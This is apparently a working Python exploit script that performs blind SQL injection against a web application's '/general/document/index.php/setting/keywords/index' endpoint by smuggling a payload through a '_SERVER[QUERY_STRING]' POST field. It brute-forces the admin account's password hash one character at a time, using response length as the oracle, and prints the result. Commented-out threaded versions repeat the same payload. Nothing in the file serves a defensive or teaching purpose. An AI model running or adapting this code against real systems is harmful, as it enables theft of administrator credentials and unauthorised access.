# coding:utf-8
import requests,time
from multiprocessing.dummy import Pool as ThreadPool

begin_time = time.time()
url = 'http://192.168.7.132'
a = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34']


b = ['36','46','47','48','49','50','51','52','53','54','55','56','57','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','97','98','99','100','101','102','103','104','105','106','107','108','109','110','111','112','113','114','115','116','117','118','119','120','121','122']

c = []

d = []

for i in a:
    for j in b:
        c.append([i,j])
        break_flag = False
        while True:
            print(i+'\t'+j)
            try:
                r = ''
                r = requests.post(url + '/general/document/index.php/setting/keywords/index', data={
                    "_SERVER[QUERY_STRING]": "kname=1' and @`'` or if((ascii(substr((select password from user where user_id='admin' limit 0,1) ," +
                                             i + ",1))) = " + j + ",1,exp(720))#"}, timeout=3).content
            # except requests.exceptions.ConnectionError:
            #     print("连接失败，0.5秒后重试")
            #     time.sleep(0.3)
            # except requests.exceptions.ChunkedEncodingError:
            #     print("分块编码错误，0.5秒后重试")
            #     time.sleep(0.3)
            # # except requests.exceptions.HTTPError:
            # #     break
            except:
                print("未知错误，0.5秒后重试")
                time.sleep(0.2)
            if len(r) > 3000:
                d.append(j)
                break_flag = True
                print(j)
            break
        if break_flag:
            break









# def test(data):
#     while True:
#         print(data)
#         try:
#             r = ''
#             r = requests.post(url + '/general/document/index.php/setting/keywords/index', data={
#                 "_SERVER[QUERY_STRING]": "kname=1' and @`'` or if((ascii(substr((select password from user where user_id='admin' limit 0,1) ," + data[0] + ",1))) = " + data[1] + ",1,exp(720))#"}, timeout=3).content
#         except requests.exceptions.ConnectionError:
#             print("连接失败，3秒后重试")
#             time.sleep(3)
#         except requests.exceptions.ChunkedEncodingError:
#             print("分块编码错误，3秒后重试")
#             time.sleep(3)
#         # except requests.exceptions.HTTPError:
#         #     break
#         except :
#             print("未知错误，3秒后重试")
#             time.sleep(3)
#         if len(r) > 3000:
#             d.append(data[1])
#             print(data[1])
#         break

# def test(data):
#     while True:
#         print(data)
#         try:
#             if len(requests.post(url + '/general/document/index.php/setting/keywords/index', data={
#                 "_SERVER[QUERY_STRING]": "kname=1' and @`'` or if((ascii(substr((select password from user where user_id='admin' limit 0,1) ," + data[0] + ",1))) = " + data[1] + ",1,exp(720))#"}, timeout=3).content) > 3000:
#                 c.append(i)
#                 print(i)
#                 break
#         except requests.exceptions.ConnectionError:
#             print("连接失败，3秒后重试")
#             time.sleep(3)
#         except requests.exceptions.ChunkedEncodingError:
#             print("分块编码错误，3秒后重试")
#             time.sleep(3)
#         except :
#             print("未知错误，3秒后重试")
#             time.sleep(3)

# pool = ThreadPool(20)
# pool.map(test, c)
# pool.close()


for k in d:
        # print(d)
        print(chr(int(k)),end='')


print()
print(time.time()-begin_time)